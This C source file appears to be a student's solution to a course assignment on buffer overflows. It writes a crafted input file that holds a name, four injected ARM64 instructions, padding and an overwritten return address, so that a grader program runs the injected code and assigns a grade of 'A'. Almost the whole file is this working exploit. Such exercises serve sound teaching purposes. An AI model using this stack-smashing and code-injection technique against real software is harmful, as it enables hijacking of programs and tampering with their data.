/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Authors: Charles Coppieters 't wallant and Stephane Pienaar        */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* 
   causes the grader program to write my name and recommend a grade of
   "A" by producing and writing to a file named dataA and returning 0
   upon completion. There is no input to this function. 
*/
int main(void) {
   /* length of the buf array */
   int BUFSIZE = 48;
   /* length of my name Charles */
   int nameSize = 7;
   /* length of instructions being stored in buf which is 16
      because there are 4 instructions of 4 bytes each */
   int instructionsSize = 16;
   /* int for the for loop */
   int i;
   /* address in the stack of first instruction */
   unsigned long ulData = 0x420060;
   /* file we will be writing to */
   FILE *psFile;
   /* get and store in a variable the machine langauge for each 
      of the instructions we need to use (see memorymap) */
   unsigned int movMLanguage;
   unsigned int adrMLanguage;
   unsigned int strbMLanguage;
   unsigned int bMLanguage;

   movMLanguage = MiniAssembler_mov(0, 'A');
   adrMLanguage = MiniAssembler_adr(1, 0x420044, 0x420064);
   strbMLanguage = MiniAssembler_strb(0, 1);
   bMLanguage = MiniAssembler_b(0x400864, 0x42006C);
   
   /* creates file dataA and opens it for writing */
   psFile = fopen("dataA", "w");
   /* writes my name to dataB file */
   fprintf(psFile, "Charles");
   /* add one null character to end the name before storing
      instructions in buf to separate between the two */
   fprintf(psFile, "%c", '\0');
   /* print the machine language to the file for each instruction */
   fwrite(&movMLanguage, sizeof(unsigned int), 1, psFile);
   fwrite(&adrMLanguage, sizeof(unsigned int), 1, psFile);
   fwrite(&strbMLanguage, sizeof(unsigned int), 1, psFile);
   fwrite(&bMLanguage, sizeof(unsigned int), 1, psFile);
   /* add \0 until the end of the buf array */
   for (i = 0; i < BUFSIZE-nameSize-1-instructionsSize; i++) {
      putc('\0', psFile);
   }
   /* write to file the address of the instructions we added to dataA
      so that now that we're past the buf, the next position in
      the stack is x30 which is supposed to return to main but
      instead it will now do the grade reassignment instructions */
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   /* closes file dataA */
   fclose(psFile);

   return 0;
}
